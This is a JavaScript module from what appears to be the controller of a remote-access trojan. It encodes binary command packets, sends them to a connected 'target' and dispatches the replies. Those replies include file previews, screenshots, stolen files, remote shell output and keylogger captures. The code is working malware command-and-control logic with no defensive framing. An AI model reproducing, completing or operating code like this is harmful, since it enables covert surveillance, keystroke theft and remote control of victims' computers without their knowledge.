import config from '../config'
// import { logger } from '../logger'
import { getCurrentTarget, clientList } from './server'
import { disconnectTarget } from '../TargetList'
import { updateKeyLogger } from '../KeyBoard'
import { fileNotFound, updateFilepreview, saveFile } from '../File'
import { shellConnect, updateShellResponse } from '../Shell'
import { updateScreenShot } from '../ScreenShot'

let target = null

var _packetID = 0
function createRequsetPayload (method, params, Id) {
  var packetID = bufferWrite4(Id)
  var totalLength = 16
  var methodID = bufferWrite4(getMethodID(method))
  var paramCount
  var body = Buffer.alloc(0)

  if (params != null) {
    paramCount = bufferWrite4(Object.keys(params).length)
    for (var key in params) {
      body = Buffer.concat([body, bufferWrite4(key.length), Buffer.from(key),
        bufferWrite4(params[key].length), Buffer.from(params[key])])
      totalLength += (8 + key.length + params[key].length)
    }
  } else paramCount = 0

  var head = Buffer.concat([packetID, bufferWrite4(totalLength), methodID, bufferWrite4(paramCount)])

  var packet = Buffer.concat([head, body])
  return packet
}

function bufferWrite4 (content) {
  var buf = Buffer.alloc(4)
  buf.writeInt32LE(content)
  return buf
}

function getMethodID (method) {
  return config.methodID[method]
}

function getPacketID () {
  return ++_packetID
}
export function sendRequest (method, params = null, timeout = config.connection.RESPONSE_TIMEOUT) {
  return new Promise((resolve, reject) => {
    if (getCurrentTarget() === null) {
      reject(new Error('Not connected'))
    }
    target = getCurrentTarget()
    let socket = target.socket
    let packetID = getPacketID()
    switch (method) {
      case 'getFilePreview':
        target.filepreviewQueue.push(packetID)
        break
      case 'screenShot':
        target.screenShotQueue.push(packetID)
        break
      case 'transFile':
        target.fileQueue.push(packetID)
        break
      case 'sendCommand':
        target.command.push(packetID)
        break
    }
    let payload = createRequsetPayload(method, params, packetID)
    resolve(payload)
    console.log(payload)
    console.log(payload.toString())
    // logger.debug(`Sending payload ${payload}`)
    /* Send payload */
    socket.write(payload, () => setTimeout(() => {
      /* Report timeout when not receiving response after a specific timeout */
      reject(new Error('Response timeout'))
    }, timeout))
  })
}

export function handshake () {
  target = getCurrentTarget().socket
  var response = Buffer.alloc(8)
  response.write('PONG')
  target.write(response)
}

function getStatus (statusCode) {
  return config.statusCodes[statusCode.toString()]
}

export function processData (data, target) {
  if (data.slice(0, 4).toString() === 'PING') {
    handshake()
  } else {
    var packetID = data.slice(0, 4).readInt32LE() 
    var statusCode = data.slice(4, 8).readInt32LE()
    var totalLength = data.slice(8, 12).readInt32LE()
    var content = data.slice(12, totalLength).toString()

    switch (statusCode) {
      case 201:
        shellConnect(target, true)
        console.log(getCurrentTarget().isShellConnected)
        break
      case 202:
        let index = {
          'filepreview': target.filepreviewQueue.indexOf(packetID),
          'screenShot': target.screenShotQueue.indexOf(packetID),
          'file': target.fileQueue.indexOf(packetID),
          'command': target.commandQueue.indexOf(packetID)
        }
        for (var key in index){
          if (index[key] !== -1){
            switch (key) {
              case 'filepreview':
                target.filepreviewQueue.shift()
                if(index[key] === 0) {
                  updateFilepreview(content)
                  // console.log(clientList[0].filepreviewQueue)
                } else {
                  console.log("packet lost")
                }
                break
              case 'screenShot':
                target.screenShotQueue.shift()
                if(index[key] === 0) {
                  updateScreenShot(content)
                  // console.log(clientList[0].filepreviewQueue)
                } else {
                  console.log("packet lost")
                }
                break
              case 'file':
                target.fileQueue.shift()
                if(index[key] === 0) {
                  saveFile(content)
                  // console.log(clientList[0].filepreviewQueue)
                } else {
                  console.log("packet lost")
                }
                break
              case 'command':
                target.commandQueue.shift()
                if(index[key] === 0) {
                  updateShellResponse(content)
                  // console.log(clientList[0].filepreviewQueue)
                } else {
                  console.log("packet lost")
                }
                break
            }
            break
          }
        }
        break
      case 203:
        updateKeyLogger(content)
        break
      case 300:
        fileNotFound()
        break
      case 401:
        disconnectTarget(target)
        break
      case 402:
        shellConnect(target, false)
        console.log(getCurrentTarget().isShellConnected)
        break
      default:
        console.log('wrong status code')
    }
    console.log(packetID)
    // console.log(getStatus(statusCode))
    console.log(totalLength)
    console.log(content)
  }
}
